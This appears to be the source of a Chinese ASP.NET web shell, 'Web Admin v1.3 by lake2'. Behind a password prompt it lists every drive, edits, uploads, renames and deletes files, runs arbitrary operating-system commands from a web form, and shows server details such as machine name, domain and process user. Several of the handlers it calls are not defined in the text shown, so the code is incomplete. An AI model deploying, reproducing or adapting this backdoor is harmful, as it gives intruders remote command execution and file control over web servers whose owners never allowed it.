<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">

<html>
<style type="text/css">
<!--
body,td,th {
	color: #0000FF;
}
body {
	background-color: #ffffff;
	font-size:14px; font:"仿宋_GB2312";
}
a:link {
	color: #0000FF;
	text-decoration: none;
}
a:visited {
	text-decoration: none;
	color: #0000FF;
}
a:hover {
	text-decoration: none;
	color: #FF0000;
}
a:active {
	text-decoration: none;
	color: #FF0000;
}
.style1 {color: #D4D0C8}
.style2 {color: #FF0000}
-->
</style>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>Web Admin v1.3 by lake2</title>
</head>
<body>

  <%
  dim Xerror as exception
  try
 if session("admin")<>1 then 
 %>
  <p>
Hello , thank you to use my program !</p>
<p> This program is run at ASP.NET Environment and control the web directory.</p>
<form runat="server">
  请输入登入密码：<asp:TextBox ID="TextBox" runat="server"  TextMode="Password" />  
  <asp:Button ID="Button" Text="Login"  OnClick="login_click" runat="server" />
</form> 
<%else
dim temp as string
temp=request.QueryString("action")
if temp="" then temp="goto"
select case temp
case "goto"
	if request.QueryString("src")<>"" then
		url=request.QueryString("src")
	else
		url=server.MapPath(".") & "\"
	end if
	call existdir(url)
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo(url)
	dim hupo as string
	dim xfile as fileinfo
%>
<p align="center">
当前所在目录为：<font color=red><%=url%></font>
<p align="center"><a href="?action=cmd" target="_blank">执行cmd命令 </a><a href="?action=information" target="_blank">系统信息</a> <a href="?action=new&src=<%=url%>" target="_blank">新建</a> 
  <%if session("jqb")<>"" then%><a href="?action=v&src=<%=url%>" target="_blank">粘贴</a><%else%>粘贴<%end if%> 
 <a href="?action=upfile&src=<%=url%>" target="_blank">上传文件</a> 
 <a href="?action=goto&src=C:%5C" class="style1"> </a> <a href="?action=goto&src=" & <%=server.MapPath(".")%>>回本文件所在目录</a>
 <%
dim i as integer
for i =0 to Directory.GetLogicalDrives().length-1
 	response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & "驱 </a>")
next
%>
</p>
<table width="90%"  border="1" align="center">
      <tr>
        <td width="34%" valign="top"><%
		response.Write("<table width='100%' border='0' style='word-break:break-all'>")
		hupo= "<tr><td><a href='?action=goto&src=" & getparentdir(url) & "'>↑回上一级目录↑</a></td></tr>"
		response.Write(hupo)
		for each xdir in mydir.getdirectories()
			response.Write("<tr>")
			hupo= "<td><a href='?action=goto&src=" & url  & xdir.name & "\" & "'>" & xdir.name & "</a></td>"
			response.Write(hupo)
			hupo="<td><a href='?action=clip&src=" & url  & xdir.name & "\' target='_blank'>剪切" & "</a>|<a href='?action=copy&src=" & url  & xdir.name & "\' target='_blank'>复制</a>|<a href='?action=del&src=" & url  & xdir.name & "\' target='_blank'" & " onclick='return del(this);'>删除</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%></td>
        <td width="66%" valign="top"><%
		response.Write("<table width='100%' border='0' style='word-break:break-all'>")
		for each xfile in mydir.getfiles()
			response.Write("<tr>")
			hupo="<td>" & xfile.name & "</td>"
			response.Write(hupo)
			hupo="<td>" & xfile.length & " byte" & "</td>"
			response.Write(hupo)
			hupo="<td><a href='?action=edit&src=" & url  & xfile.name & "' target='_blank'>编辑</a>|<a href='?action=clip&src=" & url  & xfile.name & "' target='_blank'>剪切</a>|<a href='?action=copy&src=" & url  & xfile.name & "' target='_blank'>复制</a>|<a href='?action=rename&src=" & url  & xfile.name & "' target='_blank'>重命名</a>|<a href='?action=del&src=" & url  & xfile.name & "' target='_blank' onClick='return del(this);'>删除</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
		response.Write("</table>")
		%></td>
      </tr>
</table>
<script language="javascript">
function del()
{
if(confirm("警告：确实删除吗？（不可恢复！）")){return true;}
else{return false;}
}
</script>
<%
case "del"
	dim a as string
	a=request.QueryString("src")
	call existdir(a)
	call del(a)
	response.Write("删除<font color=red>" & a & "</font>成功！刷新可看到效果！")
case "edit"
	dim b as string
	b=request.QueryString("src")
	call existdir(b)
	dim myread as new streamreader(b,encoding.default)
%>
<form name="form1" method="post" action="?action=write&src=<%=b%>">
  <table width="80%"  border="1" align="center">
    <tr>
      <td width="11%">文件路径</td>
      <td width="89%"><%=b%></td>
    </tr>
    <tr>
      <td>内容</td>
      <td><textarea name="textarea" cols="80" rows="30"><%=myread.readtoend%></textarea></td>
    </tr>
    <tr>
      <td></td>
      <td><input type="submit" name="Submit" value="提交修改"> <input type="reset" name="Submit2" value="清空内容"></td>
    </tr>
  </table>
</form>
  
<form name="form2" method="post" action="?action=newdir&src=<%=request.QueryString("src")%>" onSubmit="return check(this);">
  <table width="80%"  border="0" align="center">
    <tr>
      <td colspan="2">你将在<font color=red><%=request.QueryString("src")%></font>新建文件或文件夹。注：可以连续建多级文件夹，如填china\hacker\lake2，将会在<%=request.QueryString("src")%>下建立china\hacker\lake2文件夹。注意不要含非法字符，不然是建不起的</td>
    </tr>
    <tr>
      <td colspan="2">名称：
        <input type="text" name="name">
        <input type="submit" name="but" value="新建文件">
        <input type="submit" name="but" value="新建文件夹"></td>
    </tr>
  </table>
</form>
<script language="javascript">
function check()
{
if(form2.name.value==""){alert("必须输入名称！");return false}
else{return true}
}
</script>
<%
case "upfile"
	url=request.QueryString("src")
%>
<form name="form3" enctype="multipart/form-data" method="post" action="?src=<%=url%>" runat="server">
  选择要上传的文件
    <input type="file" id="xfile" runat="server">
    <input type="submit" id="Submit3" value="上传" runat="server" onserverclick="up">
</form>
<%
case "information"
%>
<table width="80%"  border="1" align="center">
  <tr>
    <td colspan="2"><span class="style2">Web服务器信息</span></td>
  </tr>
  <tr>
    <td width="40%">服务器IP</td>
    <td width="60%"><%=request.ServerVariables("LOCAL_ADDR")%></td>
  </tr>
  <tr>
    <td>机器名</td>
    <td><%=Environment.MachineName%></td>
  </tr>
  <tr>
    <td>网络域名</td>
    <td><%=Environment.UserDomainName.ToString()%></td>
  </tr>
  <tr>
    <td>当前进程的用户名</td>
    <td><%=Environment.UserName%></td>
  </tr>
  <tr>
    <td>操作系统</td>
    <td><%=Environment.OSVersion.ToString()%></td>
  </tr>
  <tr>
    <td>IIS版本</td>
    <td><%=request.ServerVariables("SERVER_SOFTWARE")%></td>
  </tr>
  <tr>
    <td colspan="2"><span class="style2">客户端信息</span></td>
  </tr>
  <tr>
    <td>客户端IP</td>
    <td><%=request.ServerVariables("REMOTE_ADDR")%></td>
  </tr>
  <tr>
    <td>用户标识</td>
    <td><%=request.ServerVariables("HTTP_USER_AGENT")%></td>
  </tr>
</table>
<%
case "cmd"
%>
<form runat="server">
  <asp:TextBox ID="cmd" runat="server" style="border: 1px solid #084B8E"/>
  <asp:Button ID="Button123" runat="server" Text="Run" OnClick="runcmd" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
  <p>
    <asp:Label ID="result" runat="server" style="color: #0000FF"/>      </p>
</form>
<p>
  <%
case "rename"
if request.Form("name")="" then
%>
</p>
<form name="form4" method="post" action="?action=rename&src=<%=request.QueryString("src")%>" onSubmit="return checkname();">
  <p>你想将<%=request.QueryString("src")%>重命名为：
    <input type="text" name="name">
    <input type="submit" name="Submit3" value="提交">
</p>
  <p>（注意：重命名后原文件就不存在了）</p>
</form>
<script language="javascript">
function checkname()
{
if(form4.name.value==""){alert("Sorry！输入文件名（包括后缀）");return false}
}
</script>
<p>  
<%
else
	url=request.QueryString("src")
	file.copy(url,getparentdir(url) & request.Form("name"))
	del(url)
	response.Write("重命名<font color=red>" & url & "</font>>>>>>>>>>>>><font color=red>" & getparentdir(url) & request.Form("name") & "</font>成功")
end if
end select
end if
catch Xerror
	response.Write("<br>发生错误！详情如下：<br>")
	response.Write(Xerror.tostring)
end try
%>
</p>
<hr noshade>
<p align="center"><a href="http://mrhupo.126.com" target="_blank">Web Admin
 By lake2  For Control the ASP.NET Web Directory</a> </p>
</body>
</html>
